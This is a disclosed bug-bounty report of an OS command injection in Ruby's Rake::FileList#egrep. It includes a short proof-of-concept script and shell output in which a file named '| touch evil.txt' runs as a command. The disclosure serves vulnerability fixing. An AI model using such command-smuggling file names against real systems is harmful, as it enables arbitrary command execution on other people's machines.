# OS Command Injection via egrep in Rake::FileList

## Report Details
- **Report ID**: 651518
- **URL**: https://hackerone.com/reports/651518
- **State**: Closed
- **Severity**: N/A
- **Submitted**: 2019-07-20T04:16:53.118Z
- **Disclosed**: 2019-08-29T03:12:56.050Z

## Reporter
- **Username**: kyoshida
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: ruby

## Vulnerability Information
When a file which has command file name of stating with `|` is in `Rake::FileList`, then `egrep` will execute the command.

# How to reproduce

PoC (`poc_rake.rb`) is the following.

```ruby
require 'rake'

list = Rake::FileList.new(Dir.glob('*'))
p list
list.egrep(/something/)
```

Example of executing.

```
% ls -1
Gemfile
Gemfile.lock
poc_rake.rb
vendor
| touch evil.txt
% bundle exec ruby poc_rake.rb
["poc_rake.rb", "Gemfile", "Gemfile.lock", "| touch evil.txt", "vendor"]
poc_rake.rb:6:list.egrep(/something/)
Error while processing 'vendor': Is a directory @ io_fillbuf - fd:7 vendor
% ls -1
Gemfile
Gemfile.lock
evil.txt
poc_rake.rb
vendor
| touch evil.txt
```

`evil.txt` was created.

## Impact

An attacker must deploy a file containing command names in the target environment, assuming that this attack is successful. If that would be a serious problem.

## Attachments
No attachments
